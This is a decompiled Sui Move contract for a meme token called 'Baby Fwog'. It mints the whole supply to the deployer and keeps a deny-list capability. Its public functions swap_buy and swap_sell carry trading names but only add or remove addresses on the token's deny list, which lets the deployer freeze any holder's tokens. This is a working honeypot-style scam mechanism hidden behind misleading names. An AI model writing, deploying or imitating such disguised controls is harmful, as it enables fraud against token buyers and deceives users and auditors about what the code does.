module 0x69efdb26a87211c853f5570db0bb8b1aefa88f77675f5d6e26aaa1d1dd87c86b::bfwog {
    struct BFWOG has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BFWOG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BFWOG>(arg0, 9, b"BFWOG", b"Baby Fwog", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://gateway.irys.xyz/a5t48SdH7DObibMXJ4q__ODs6Kx4e18IyRRGWdwQKdY"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BFWOG>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BFWOG>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BFWOG>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BFWOG>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BFWOG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BFWOG>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BFWOG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BFWOG>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

